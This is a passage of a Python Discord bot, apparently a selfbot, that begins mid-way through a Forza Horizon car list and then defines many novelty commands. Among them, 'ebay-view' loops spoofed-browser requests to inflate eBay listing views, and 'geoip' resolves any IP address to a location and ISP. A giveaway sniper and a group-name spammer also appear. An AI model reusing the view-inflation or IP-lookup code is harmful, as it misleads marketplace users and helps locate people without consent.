'R	HOR XB1 Subaru WRX 15 about this car	2015	Subaru WRX STI	Autoshow	42,000 CR	6.7	6.0	7.0	8.8	6.1	B 693',
'R	HOR XB1 Sunbeam Tiger about this car	1967	Sunbeam Tiger	Autoshow	65,000 CR	5.8	4.5	5.6	7.1	4.5	D 500',
'R	HOR XB1 Talbot Sunbeam about this car	1979	Talbot Sunbeam Lotus	Autoshow	25,000 CR	5.3	4.6	5.4	6.9	4.7	D 469',
'E	HOR XB1 Tamo Racemo about this car	2017	Tamo Racemo	Autoshow	600,000 CR	5.9	5.7	6.1	7.8	5.6	C 577',
'L	HOR XB1 Terradyne Gurkha about this car	2014	Terradyne Gurkha LAPV	Autoshow	450,000 CR	5.0	5.1	3.5	4.1	5.3	D 223',
'L	HOR XB1 TG Track-Tor about this car	2014	Top Gear Track-Tor	HL: Top Gear - Tier 5	250,000 CR	5.2	6.9	6.8	8.4	5.9	C 577',
'L	HOR XB1 Toyota 1 T100 about this car	1993	Toyota 1 T100 Baja Truck	Autoshow	500,000 CR	5.6	6.6	7.4	9.2	6.5	A 732',
'L	HOR XB1 Toyota 1 T100 WP about this car	1993	Toyota 1 T100 Baja Truck "Welcome Pack"	DLC: Welcome Pack	500,000 CR	7.1	7.1	8.6	9.9	6.6	A 800',
'L	HOR XB1 Toyota 2000GT about this car	1969	Toyota 2000GT	Hard-to-Find: Festival reward	750,000 CR	6.0	4.6	5.5	7.0	4.4	D 447',
'R	HOR XB1 Toyota Celica 74 FH4 about this car	1974	Toyota Celica GT	Hard-to-Find: Festival reward	250,000 CR	5.1	4.5	4.6	6.3	4.4	D 312',
'E	HOR XB1 Toyota Celica 92 FH4 about this car	1992	Toyota Celica GT-Four RC ST185	Hard-to-Find: Festival reward	250,000 CR	6.5	5.2	6.3	8.4	5.1	C 577',
'R	HOR XB1 Toyota Celica 94 FH4 about this car	1994	Toyota Celica GT-Four ST205	Hard-to-Find: Festival reward	250,000 CR	6.8	5.1	6.7	8.4	5.0	C 595',
'R	HOR XB1 Toyota Corolla 74 FH4 about this car	1974	Toyota Corolla SR5	Hard-to-Find: Festival reward	250,000 CR	4.8	4.5	4.2	6.8	4.5	D 290',
'E	HOR XB1 Toyota GT86 FH4 about this car	2013	Toyota GT86	Hard-to-Find: Festival reward	250,000 CR	6.2	5.2	5.8	7.3	5.1	C 562',
'C	HOR XB1 Toyota Hilux about this car	2007	Toyota Hilux Arctic Trucks AT38	Autoshow	55,000 CR	5.0	6.7	4.6	5.8	5.7	C 516',
'C	HOR XB1 Toyota Land about this car	2016	Toyota Land Cruiser Arctic Trucks AT37	Autoshow	83,000 CR	5.0	6.3	4.3	5.1	5.3	D 444',
'R	HOR XB1 Toyota MR2 95 about this car	1995	Toyota MR2 GT	Hard-to-Find: Festival reward	250,000 CR	6.8	5.3	6.6	8.3	4.8	B 621',
'R	HOR XB1 Toyota MR2 89 about this car	1989	Toyota MR2 SC	Hard-to-Find: Festival reward	250,000 CR	5.9	4.9	5.6	7.6	4.7	D 481',
'E	HOR XB1 Toyota Sprinter FH4 about this car	1985	Toyota Sprinter Trueno GT Apex	Hard-to-Find: Festival reward	250,000 CR	5.4	4.7	5.6	7.2	4.5	D 444',
'R	HOR XB1 Toyota Supra 92 FH4 about this car	1992	Toyota Supra 2.0 GT	Hard-to-Find: Festival reward	250,000 CR	6.2	5.1	5.8	7.5	4.7	C 543',
'L	HOR XB1 Toyota Supra 98 FH4 about this car	1998	Toyota Supra RZ	Autoshow	250,000 CR	7.1	6.1	6.2	7.8	5.6	B 693',
'R	HOR XB1 Triumph Spitfire about this car	1962	Triumph Spitfire	Barn Find	20,000 CR	5.0	3.9	5.0	6.3	3.7	D 203',
'C	HOR XB1 Triumph TR3B about this car	1962	Triumph TR3B	DLC: Car Pass	25,000 CR	4.8	4.4	3.9	5.8	4.3	D 243',
'C	HOR XB1 Triumph TR6 about this car	1970	Triumph TR6 PI	DLC: Car Pass	25,000 CR	5.5	4.6	5.0	6.3	4.5	D 419',
'E	HOR XB1 Triumph TR7 about this car	1979	Triumph TR7 Roadster	HL: Horizon Super7 - Tier 7	250,000 CR	5.0	4.7	4.2	5.4	4.4	D 245',
'L	HOR XB1 TVR Cerbera about this car	1998	TVR Cerbera Speed 12	Barn Find	500,000 CR	9.0	7.7	6.6	8.2	7.7	S1 874',
'R	HOR XB1 TVR Griffith about this car	2018	TVR Griffith	DLC: Car Pass	105,000 CR	7.7	7.9	6.9	8.6	8.3	S1 844',
'E	HOR XB1 TVR Sagaris about this car	2005	TVR Sagaris	Autoshow	86,000 CR	7.2	7.1	6.4	8.1	7.0	A 797',
'F	HOR XB1 TVR Sagaris FE about this car	2005	TVR Sagaris F.E.	Skill Tree:  TVR Sagaris	336,000 CR	7.9	9.4	7.9	9.4	9.1	S2 902',
'R	HOR XB1 TVR Tuscan about this car	2001	TVR Tuscan S	Hard-to-Find: Festival reward	250,000 CR	7.1	6.3	6.6	8.2	6.3	A 747',
'E	HOR XB1 Ultima Evolution about this car	2015	Ultima Evolution Coupe 1020	HL: The Drag Strip - Tier 4	130,000 CR	9.0	10	8.6	9.8	10	S2 998',
'C	HOR XB1 Vauxhall Astra about this car	2012	Vauxhall Astra VXR	Autoshow	25,000 CR	6.5	6.3	6.1	7.8	6.7	B 684',
'C	HOR XB1 Vauxhall Corsa 09 about this car	2009	Vauxhall Corsa VXR	Hard-to-Find: Festival reward	250,000 CR	6.1	5.9	5.3	7.4	5.1	C 600',
'C	HOR XB1 Vauxhall Corsa 16 about this car	2016	Vauxhall Corsa VXR	Autoshow	28,000 CR	5.9	6.1	5.2	7.5	6.3	B 610',
'C	HOR XB1 Vauxhall Insignia about this car	2010	Vauxhall Insignia VXR	DLC: Car Pass	42,000 CR	7.1	6.0	6.8	8.6	6.0	B 676',
'R	HOR XB1 Vauxhall Lotus about this car	1990	Vauxhall Lotus Carlton	Autoshow	70,000 CR	7.2	5.4	5.9	7.6	5.3	B 665',
'C	HOR XB1 Vauxhall Monaro about this car	2005	Vauxhall Monaro VXR	Autoshow	25,000 CR	7.6	6.0	6.2	7.8	5.5	A 716',
'C	HOR XB1 Vauxhall VX220 about this car	2004	Vauxhall VX220 Turbo	DLC: Car Pass	20,000 CR	6.4	6.8	7.1	8.7	6.8	A 717',
'E	HOR XB1 VW 34 Beetle about this car	2017	Volkswagen 34 Volkswagen Andretti Rallycross Beetle	Autoshow	500,000 CR	5.7	7.8	10	10	8.1	S1 869',
'L	HOR XB1 VW 94 ID about this car	2018	Volkswagen 94 Volkswagen Motorsport I.D R Pikes Peak	Hard-to-Find: Festival reward	250,000 CR	6.2	10	10	10	10	S2 998',
'E	HOR XB1 VW 1107 Bug about this car	1970	Volkswagen 1107 Desert Dingo Racing Stock Bug	Autoshow	25,000 CR	4.8	6.0	4.7	6.4	5.2	D 438',
'L	HOR XB1 VW Beetle about this car	1963	Volkswagen Beetle	Autoshow	20,000 CR	4.1	4.0	3.7	3.8	3.8	D 100',
'E	HOR XB1 VW Class about this car	1969	Volkswagen Class 5/1600 Baja Bug	Autoshow	60,000 CR	4.6	6.3	4.5	7.2	6.1	D 407',
'C	HOR XB1 VW Corrado about this car	1995	Volkswagen Corrado VR6	Autoshow	20,000 CR	6.2	5.2	5.5	7.1	4.8	C 535',
'R	HOR XB1 VW Double about this car	1966	Volkswagen Double Cab Pick-Up	DLC: Car Pass	50,000 CR	3.8	4.0	3.6	3.7	4.0	D 100',
'E	HOR XB1 VW Global about this car	2014	Volkswagen Global RallyCross Beetle	Wheelspin reward	500,000 CR	6.1	7.6	10	10	7.9	S1 846',
'C	HOR XB1 VW Golf 83 about this car	1983	Volkswagen Golf GTI	Autoshow	20,000 CR	5.2	4.7	5.4	6.9	4.6	D 408',
'C	HOR XB1 VW Golf 92 about this car	1992	Volkswagen Golf Gti 16v Mk2	Autoshow	20,000 CR	5.5	5.0	5.2	6.5	4.7	D 454',
'R	HOR XB1 VW Golf 10 about this car	2010	Volkswagen Golf R	Wheelspin reward	64,000 CR	6.5	5.8	6.6	8.3	5.1	B 661',
'R	HOR XB1 VW Golf 14 about this car	2014	Volkswagen Golf R	Autoshow	50,000 CR	6.6	6.0	7.3	8.9	5.6	B 672',
'R	HOR XB1 VW Golf 03 about this car	2003	Volkswagen Golf R32	Autoshow	20,000 CR	6.4	5.8	6.6	8.6	5.4	B 630',
'C	HOR XB1 VW GTI about this car	1998	Volkswagen GTI VR6 Mk3	Autoshow	25,000 CR	5.9	5.1	5.5	6.9	5.1	C 512',
'C	HOR XB1 VW Karmann about this car	1967	Volkswagen Karmann Ghia	Hard-to-Find: Festival reward	250,000 CR	4.2	4.5	3.7	5.4	4.6	D 100',
'R	HOR XB1 VW Scirocco 11 about this car	2011	Volkswagen Scirocco R	Autoshow	45,000 CR	6.5	6.2	6.0	7.7	6.2	B 678',
'C	HOR XB1 VW Scirocco 81 about this car	1981	Volkswagen Scirocco S	Autoshow	20,000 CR	4.8	4.6	4.4	6.4	4.5	D 264',
'C	HOR XB1 VW Touareg about this car	2008	Volkswagen Touareg R50	Autoshow	48,000 CR	6.4	5.9	5.5	9.0	6.3	B 631',
'L	HOR XB1 VW Type 2 about this car	1963	Volkswagen Type 2 De Luxe	Autoshow	40,000 CR	3.8	4.0	3.6	3.9	3.9	D 100',
'F	HOR XB1 VW Type 2 FE about this car	1963	Volkswagen Type 2 De Luxe F.E.	Wheelspin reward	290,000 CR	8.7	8.6	10	10	8.3	S1 897',
'C	HOR XB1 VW Type 3 about this car	1967	Volkswagen Type 3 1600 L	Hard-to-Find: Festival reward	250,000 CR	4.6	4.5	3.8	5.6	4.5	D 153',
'C	HOR XB1 Volvo 242 about this car	1983	Volvo 242 Turbo Evolution	Autoshow	45,000 CR	5.9	4.5	5.5	7.0	4.8	C 512',
'C	HOR XB1 Volvo 850 about this car	1997	Volvo 850 R	Autoshow	25,000 CR	6.5	5.0	5.1	6.5	4.6	C 544',
'E	HOR XB1 Volvo Iron about this car	2016	Volvo Iron Knight	Autoshow	800,000 CR	7.6	5.9	7.3	8.9	6.9	A 797',
'R	HOR XB1 Volvo V60 about this car	2015	Volvo V60 Polestar	Autoshow	62,000 CR	6.8	5.5	7.0	8.9	5.7	B 652',
'L	HOR XB1 WM Lykan about this car	2016	W Motors Lykan HyperSport	Autoshow	3,400,000 CR	8.7	8.4	7.7	9.2	9.0	S2 907',
'C	HOR XB1 Willys MB about this car	1945	Willys MB Jeep	Autoshow	40,000 CR	3.9	4.2	4.0	6.0	4.0	D 100',
'L	HOR XB1 Zenvo ST1 about this car	2016	Zenvo ST1	HL: World s Fastest - Tier 10	1,000,000 CR	8.8	7.9	7.1	8.7	8.4	S1 900',
'L	HOR XB1 Zenvo TSR-S  	2019	Zenvo TSR-S	Hard-to-Find: Festival reward	1,200,000 CR	8.9	9.9	8.2	9.5	10	S2 972',
'Locked cars',
'Gameplay',
'Rarity	Year	Vehicle	Unlock	Value	S	H	A	L	B	PI',
'Common	1964	Austin FX4 Taxi (Horizon Stories)	 Only playable in Isha s Taxis	10,000 CR	4.6	3.8	3.7	5.1	3.6	C 577',
'Epic	1957	Chevrolet Bel Air (Horizon Stories)	 Only playable in LaRacer @ Horizon	35,000 CR	5.7	5.4	4.7	5.1	4.8	C 553',
'Legendary	2018	McLaren Senna (Autumn Prologue)	 Only playable in prologue Autumn Season	1,800,000 CR	7.6	10	8.8	9.9	10	S2 975',
'Legendary	2018	McLaren Senna (Summer Prologue)	 Only playable in prologue Summer Season	1,800,000 CR	8.0	10	8.8	9.9	10	S2 981',
'Traffic',
'2010 Abarth 500 esseesse',
'2004 Audi S4',
'2000 BMW 323ti Sport',
'2011 BMW X5 M',
'2009 Ford Fiesta Zetec S',
'2011 Ford Transit Diesel',
'1997 Land Rover Defender 90',
'2010 Mazda Mazdaspeed 3',
'2009 Mercedes-Benz A200 Turbo Coupe',
'2004 Mercedes-Benz C32 AMG',
'1965 Mini Cooper S',
'2009 Mini John Cooper Works',
'2005 Subaru Legacy B4 2.0 GT',
'2003 Volkswagen Bora VR6',
'2011 Volkswagen Fox',
'1998 Volkswagen GTI VR6 Mk3',
'2014 Playground Box Truck',
'2014 Playground Bus',
'2014 Playground Flatbed',
'Playground Gritter',
'Playground Tractor',
'Trivia',
'Shelby Monaco King Cobra',
'Ferrari F40 Competizione',
'Mazda RX-8 R3',
'Aston Martin Vulcan AMR Pro',
'Lancia 037 Stradale'
   ]
    answer = random.choice(uatus)
    await ctx.send(answer)



@client.command()
async def gtac(ctx):
    await ctx.message.delete()
    cars = [
'_9F',
'_9F Cabrio [RET]',
'Alpha [DLC]',
'Banshee',
'Blista Compact [EV]',
'Buffalo',
'Buffalo S',
'Carbonizzare',
'Comet',
'Coquette',
'Elegy RH8',
'Feltzer',
'Furore GT [DLC]',
'Fusilade',
'Futo',
'Go Go Monkey Blista [EV] [RP]',
'Jester [DLC]',
'Jester (Racecar) [DLC]',
'Massacro [DLC]',
'Massacro (Racecar) [DLC]',
'Penumbra',
'Rapid GT',
'Rapid GT (Convertible) [RET]',
'Schwartzer',
'Sprunk Buffalo [EV] [RP]',
'Sultan',
'Surano [RET]',
'Blade [DLC]',
'Buccaneer',
'Burger Shot Stallion [EV] [RP]',
'Chino [DLC]',
'Coquette BlackFin [DLC]',
'Dominator',
'Duke O Death [EV] [RP]',
'Dukes [EV]',
'Gauntlet',
'Hotknife [CE]',
'Phoenix',
'Picador',
'Pißwasser Dominator [EV] [RP]',
'Rat-Loader',
'Rat-Truck [DLC]',
'Redwood Gauntlet [EV] [RP]',
'Ruiner',
'Sabre Turbo',
'Slamvan [DLC]',
'Stallion [EV]',
'Vigero',
'Virgo [DLC]',
'Voodoo',
    ]
    answer = random.choice(cars)
    await ctx.send(answer)

@client.command()
async def rekted(ctx):
    await ctx.send('http://gph.is/2ETpt7Y')

@client.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="ed sheeran as animal", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])

@client.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff)

@client.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@client.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int): # b'\xfc'
    await ctx.message.delete()
    start_time = datetime.datetime.now()
    def EbayViewer(url, views):
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        for _i in range(views):
            requests.get(url, headers=headers)
    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='Ebay View Bot')
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)

@client.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@client.command()
async def pingweb(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)

@client.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.clientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            await ctx.send(embed=em)

@client.command()
async def revav(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@client.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Alucard.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Alucard.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Alucard.giveaway_sniper = False


@client.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:=D
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:=D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:=D
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D
             :trumpet:      :eggplant:
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant:
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')



@client.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.clientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}"))

@client.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = ""
        name = "Test"
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)



@client.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Geekiemagik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_magik.png"))
        except:
            await ctx.send(res['message'])


@client.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_fry.png"))
        except:
            await ctx.send(res['message'])

@client.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)




@client.command()
async def blur(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/blur?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_blur.png"))
        except:
            await ctx.send(endpoint)


@client.command(aliases=["pixel"])
async def pixelate(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_blur.png"))
        except:
            await ctx.send(endpoint)

@client.command()
async def gay(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/gay?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_invert.png"))
        except:
            await ctx.send(endpoint)

@client.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.clientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"GeekieSB_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])


@client.command()
async def topic(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)



@client.command()
async def communist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/communist?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"GeekieSB_invert.png"))
        except:
            await ctx.send(endpoint)





@client.command()
async def supreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.clientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"GeekieSB_supreme.png"))
    except:
        await ctx.send(endpoint)


@client.command()
async def darksupreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
    try:
        async with aiohttp.clientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"GeekieSB_dark_supreme.png"))
    except:
        await ctx.send(endpoint)



@client.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

@client.command()
async def whois(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
